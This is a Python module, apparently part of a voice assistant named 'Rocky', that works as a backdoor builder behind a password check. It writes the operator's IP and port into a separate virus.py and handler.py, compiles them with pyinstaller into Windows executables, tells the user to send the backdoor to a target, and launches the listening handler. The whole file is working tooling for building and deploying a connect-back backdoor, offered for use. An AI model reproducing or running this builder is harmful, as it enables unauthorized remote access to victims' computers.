import win32com.client as wincl
import hashlib
import socket
import re
import os
import shutil

speak = wincl.Dispatch("SAPI.SpVoice")

class Pentest:

    '''Pentesting Class'''

    def __init__(self):
        self.nightMode = False
        self.__authenticated = False
        self.__warn = lambda : self.__talk("You are not authenticated to do malicious things")

    def __askPermission(self):
        speak.Speak(" Enter the password for verification")
        get_pass = str(input("Enter the password for verification: "))
        if "why" in get_pass or "why?" in get_pass:
            self.__talk("Only my master can command me to do malicious things")
        else:
            if hashlib.sha224(
                    get_pass.strip().encode()).hexdigest() == "70a1cf186dc4b90c4230ab9772768ed7c4c360a916c9c74875face45":
                self.__authenticated = True
                self.__talk("Access Granted")
            else:
                self.__talk("Password is incorrect")

    def __talk(self, string):
        print(string)
        if self.nightMode == False:
            speak.Speak(string)

    def __setup__connection(self):
        hostname = socket.gethostname()
        ip_addr = str(socket.gethostbyname(hostname))
        self.__talk("Using the IP address " + ip_addr)
        speak.Speak("Enter the port number that you want to listen")
        port = int(input("Enter the port number that you want to listen: "))
        obj = (ip_addr, port)
        return obj

    def __windows(self, conn_obj):
        self.__talk("Iam working on the backdoor, please wait...")
        with open("C:/users/adhit/PycharmProjects/Rocky/Pentest/Backdoor/virus.py", "r") as virus:
            code = virus.read()
        regex1 = re.compile("host = \"\w{3}.\w{2,3}.\w{1,3}.\w{1,3}\"")
        regex2 = re.compile("port = \d{3,6}")
        code = regex1.sub("host = " + str("\"" + conn_obj[0] + "\""), code)
        code = regex2.sub("port = " + str(conn_obj[1]), code)
        with open("C:/users/adhit/PycharmProjects/Rocky/Pentest/Backdoor/virus.py", "w") as virus:
            virus.write(code)
        with open("C:/users/adhit/PycharmProjects/Rocky/Pentest/Backdoor/handler.py", "r") as handler:
            code = handler.read()
        code = regex1.sub("host = " + str("\"" + conn_obj[0] + "\""), code)
        code = regex2.sub("port = " + str(conn_obj[1]), code)
        with open("C:/users/adhit/PycharmProjects/Rocky/Pentest/Backdoor/handler.py", "w") as handler:
            handler.write(code)
        os.chdir("C:/users/adhit/pycharmprojects/Rocky/Pentest/Backdoor/")
        os.system("pyinstaller --onefile virus.py")
        shutil.rmtree("build")
        shutil.rmtree("__pycache__")
        os.remove("virus.spec")
        os.chdir("dist")
        os.system("move virus.exe c:/users/adhit/desktop")
        os.chdir("..")
        os.rmdir("dist")
        self.__talk("The backdoor is saved in the desktop, send it to the target")
        self.__deployHandler()

    def __deployHandler(self):
        self.__talk("Trying to deploy the handler, please wait...")
        os.chdir("C:/users/adhit/pycharmprojects/rocky/pentest/backdoor/")
        os.system("pyinstaller --onefile handler.py")
        shutil.rmtree("build")
        os.remove("handler.spec")
        os.chdir("dist")
        os.system("move handler.exe c:/users/adhit/desktop")
        self.__talk("Handler is saved in the desktop")
        os.chdir("..")
        os.rmdir("dist")
        shutil.rmtree("__pycache__")
        os.chdir("c:/users/adhit/desktop/")
        os.system("start handler.exe")
        self.__talk("Handler deployed successfully")


    def parse(self, string):
        if "start pentesting" in string or "enable malicious rocky" in string:
            if self.__authenticated is False:
                self.__askPermission()
            else:
                self.__talk("You are already authenticated")
        elif "come to normal" in string:
            if self.__authenticated is True:
                self.__authenticated = False
                self.__talk("Ok sir")
            else:
                self.__talk("Iam already normal master")
        elif "create a backdoor" in string and "windows" not in string and "linux" not in string and "mac" not in string:
            if self.__authenticated is True:
                self.__talk("Please specify the operating system to attack: ")
                OS = str(input())
                OS = OS.lower()

                if OS == "windows":
                   conn_obj = self.__setup__connection()
                   self.__windows(conn_obj)
                elif OS == "linux":
                    self.__talk("Sorry sir, I can't do that right now")
                elif OS == "mac":
                    self.__talk("Sorry sir, I can't do that right now")
                else:
                    self.__talk("Invalid operating system")
            else:
                self.__warn()
        elif "create backdoor for windows" in string:
            if self.__authenticated is True:
                conn_obj = self.__setup__connection()
                self.__windows(conn_obj)
            else:
                self.__warn()
        elif "create backdoor for linux" in string:
            if self.__authenticated is True:
                self.__talk("Sorry sir, I can't do that right now")
            else:
                self.__warn()
        elif "create backdoor for mac" in string:
            if self.__authenticated is True:
                self.__talk("Sorry sir, I can't do that right now")
            else:
                self.__warn()
        elif "deploy handler for backdoor" in string or "deploy handler" in string:
            if self.__authenticated is True:
                self.__deployHandler()
            else:
                self.__warn()